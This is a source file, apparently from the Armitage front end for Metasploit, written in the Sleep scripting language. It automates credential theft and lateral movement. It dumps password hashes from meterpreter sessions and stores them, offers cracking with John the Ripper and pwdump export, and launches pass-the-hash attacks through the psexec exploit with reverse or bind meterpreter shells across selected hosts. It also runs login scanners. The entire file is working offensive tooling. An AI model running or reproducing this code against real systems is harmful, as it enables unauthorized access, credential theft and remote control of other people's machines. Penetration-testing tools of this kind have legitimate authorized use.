#
# pass the hash attack gets its own file.
#
import java.awt.*;
import java.awt.event.*;

import javax.swing.*;
import javax.swing.event.*;
import javax.swing.table.*;

import msf.*;
import table.*;

%handlers["hashdump"] = {
	this('$host @commands $safe');

	if ($0 eq "begin" && "*Unknown command*hashdump*" iswm $2) {
		$host = $null;

		if ($safe is $null) {
			$safe = 1;
			m_cmd($1, "use priv");
			m_cmd($1, "hashdump");
		}
		else {
			showError("hashdump is not available here");
			$safe = $null;
		}
	}
	else if ($0 eq "execute") {
		$host = sessionToHost($1);
	}
	else if ($0 eq "update" && $host !is $null && $2 ismatch '(.*?):(\d+):([a-zA-Z0-9]+:[a-zA-Z0-9]+).*?') {
		local('$user $gid $hash');
		($user, $gid, $hash) = matched();
		call($client, "db.report_auth_info", %(host => $host, port => "445", sname => "smb", user => $user, pass => $hash, type => "smb_hash", active => "true"));
	}
	else if ($0 eq "end" && ("*Error running*" iswm $2 || "*Operation failed*" iswm $2)) {
		showError("Hash dump failed. Ask yourself:\n\n1) Do I have system privileges?\n\nNo? Then use Access -> Escalate Privileges\n\n2) Is meterpreter running in a process owned\nby a System user?\n\nNo? Use Explore -> Show Processes and migrate\nto a process owned by a System user.");
		$host = $null;
	}
	else if ($0 eq "end" && $host !is $null) {
		elog("dumped hashes on $host");
		showError("Hashes dumped.\nUse View -> Credentials to see them.");
		$host = $null;
	}
};

sub explode_cred {
	local('$t %r $key $value $v');
	$t = split('\s+', $1);
	foreach $v ($t) {
		if ('=' isin $v) {
			($key, $value) = split('=', $v);
			%r[$key] = $value;
		}
	}
	return %r;
}

sub refreshCredsTable {
	local('$tmp_console $model');
	($model) = $1;
	$tmp_console = createConsole($client);
	cmd($client, $tmp_console, "creds", lambda({
		[$model clear: 128];

		local('$c $line');
		foreach $line (split("\n", $3)) {
			local('$host $port $user $pass $type $active');
			($host, $port, $user, $pass, $type, $active) = split('\s{2,}', $line);
			if ($user ne "" && $user ne "user" && $user ne "----") {
				[$model addEntry: %(
					host => $host,
					port => $port,
					user => $user,
					pass => $pass,
					type => $type,
					active => $active
				)];
			}
		}

		[$model fireListeners];
		call($client, "console.destroy", $tmp_console);
	}, \$model, \$tmp_console));
}

sub show_hashes {
	local('$dialog $model $table $sorter $o $user $pass $button $reverse $domain');	

	$dialog = dialog($1, 480, 320);

        $model = [new GenericTableModel: @("user", "pass", "host"), "user", 128];
 	
        $table = [new JTable: $model];
        $sorter = [new TableRowSorter: $model];
	[$sorter toggleSortOrder: 0];
	[$sorter setComparator: 2, &compareHosts];
        [$table setRowSorter: $sorter];

	refreshCredsTable($model);

	[$dialog add: [new JScrollPane: $table], [BorderLayout CENTER]];
	return @($dialog, $table, $model);
}

sub createCredentialsTab {
	local('$dialog $table $model $panel $export $crack $refresh');
	($dialog, $table, $model) = show_hashes("");
	[$dialog removeAll];

	$panel = [new JPanel];
	[$panel setLayout: [new BorderLayout]];
	[$panel add: [new JScrollPane: $table], [BorderLayout CENTER]];

	$refresh = [new JButton: "Refresh"];
	[$refresh addActionListener: lambda({
		refreshCredsTable($model, $null);
	}, \$model)];

	$crack = [new JButton: "Crack Passwords"];
	[$crack addActionListener: {
		launch_dialog("Crack Passwords", "auxiliary", "analyze/jtr_crack_fast", 1);		
	}];

	$export = [new JButton: "Export"];
	[$export addActionListener: {
		local('$file');
		$file = iff($REMOTE, ask("Where should I save the file?"), saveFile2());
		if ($file !is $null) {
			cmd_safe("db_export -f pwdump -a $file", lambda({
				showError("Exported credentials to:\n $+ $file");

				if ($mclient !is $client) {
					downloadFile($file);
				}
			}, \$file));
		}
	}];

	[$panel add: center($refresh, $crack, $export), [BorderLayout SOUTH]];
	[$frame addTab: "Credentials", $panel, $null];
}

sub pass_the_hash {
	local('$dialog $model $table $sorter $o $user $pass $button $reverse $domain $bottom $b2');	

	($dialog, $table, $model) = show_hashes("Pass the Hash");
	[[$table getSelectionModel] setSelectionMode: [ListSelectionModel SINGLE_SELECTION]];

	$bottom = [new JPanel];
	[$bottom setLayout: [new GridLayout: 4, 1]];

	$user = [new JTextField: 32];
	$pass = [new JTextField: 32];
	$domain = [new JTextField: 32];
	[$domain setText: "WORKGROUP"];

	$button = [new JButton: "Launch"];

	[[$table getSelectionModel] addListSelectionListener: lambda({
		[$user setText: [$model getSelectedValueFromColumn: $table, "user"]];
		[$pass setText: [$model getSelectedValueFromColumn: $table, "pass"]];
	}, \$table, \$model, \$user, \$pass)];

	$reverse = [new JCheckBox: "Use reverse connection"];

	[$bottom add: label_for("User", 75, $user)];
	[$bottom add: label_for("Pass", 75, $pass)];
	[$bottom add: label_for("Domain", 75, $domain)];
	[$bottom add: $reverse];

	[$button addActionListener: lambda({
		local('$u $p %options $host');
		%options["SMBDomain"] = [$domain getText];
		%options["SMBUser"] = [$user getText];
		%options["SMBPass"] = [$pass getText];

		if ([$reverse isSelected]) {
			%options["LHOST"] = $MY_ADDRESS;
			%options["PAYLOAD"] = "windows/meterpreter/reverse_tcp";
		}	
		else {
			%options["PAYLOAD"] = "windows/meterpreter/bind_tcp";
		}
		%options["LPORT"] = randomPort();

		foreach $host ($hosts) {
			%options["RHOST"] = $host;
			warn(%options);
			call($client, "module.execute", "exploit", "windows/smb/psexec", %options);
		}
		elog("psexec: " . [$user getText] . ":" . [$pass getText] . " @ " . join(", ", $hosts));
		[$dialog setVisible: 0];
	}, \$dialog, \$user, \$domain, \$pass, \$reverse, \$hosts)];

	$b2 = [new JPanel];
	[$b2 setLayout: [new BorderLayout]];
	[$b2 add: $bottom, [BorderLayout NORTH]];
	[$b2 add: center($button), [BorderLayout SOUTH]];

	[$dialog add: [new JScrollPane: $table], [BorderLayout CENTER]];
	[$dialog add: $b2, [BorderLayout SOUTH]];

	[$dialog setVisible: 1];
}


sub show_login_dialog {
	local('$port $srvc');
	($port, $srvc) = values($service, @("port", "name"));

	local('$dialog $model $table $sorter $o $user $pass $button $reverse $domain $bottom $b2');	

	($dialog, $table, $model) = show_hashes("login");
	[[$table getSelectionModel] setSelectionMode: [ListSelectionModel SINGLE_SELECTION]];

	$bottom = [new JPanel];
	[$bottom setLayout: [new GridLayout: 2, 1]];

	$user = [new JTextField: 32];
	$pass = [new JTextField: 32];

	$button = [new JButton: "Launch"];

	[[$table getSelectionModel] addListSelectionListener: lambda({
		[$user setText: [$model getSelectedValueFromColumn: $table, "user"]];
		[$pass setText: [$model getSelectedValueFromColumn: $table, "pass"]];
	}, \$table, \$model, \$user, \$pass)];

	[$bottom add: label_for("User", 75, $user)];
	[$bottom add: label_for("Pass", 75, $pass)];

	[$button addActionListener: lambda({
		local('$u $p %options $host');
		%options["USERNAME"] = [$user getText];
		%options["PASSWORD"] = [$pass getText];
		%options["RHOSTS"] = join(', ', $hosts);
		%options["RPORT"] = $port;
		warn("$srvc $+ : $port => " . %options);
		elog("login $srvc with " . [$user getText] . ":" . [$pass getText] . " @ " . %options["RHOSTS"]);
		call($client, "module.execute", "auxiliary", "scanner/ $+ $srvc $+ / $+ $srvc $+ _login", %options);
		[$dialog setVisible: 0];
	}, \$dialog, \$user, \$pass, \$hosts, \$srvc, \$port)];

	$b2 = [new JPanel];
	[$b2 setLayout: [new BorderLayout]];
	[$b2 add: $bottom, [BorderLayout NORTH]];
	[$b2 add: center($button), [BorderLayout SOUTH]];

	[$dialog add: [new JScrollPane: $table], [BorderLayout CENTER]];
	[$dialog add: $b2, [BorderLayout SOUTH]];

	[$dialog setVisible: 1];
}

